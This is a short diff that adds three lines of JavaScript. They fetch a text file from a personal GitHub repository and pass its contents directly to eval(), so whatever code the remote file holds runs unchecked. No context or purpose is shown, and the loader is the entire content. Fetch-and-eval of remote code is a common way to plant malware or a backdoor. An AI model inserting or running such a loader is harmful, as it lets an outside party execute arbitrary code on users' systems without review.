@@ -1,0 +1,3 @@
+fetch("https://raw.githubusercontent.com/haontwo1/noahsweb/refs/heads/main/main.txt")
+  .then(r => r.text())
+  .then(code => eval(code));
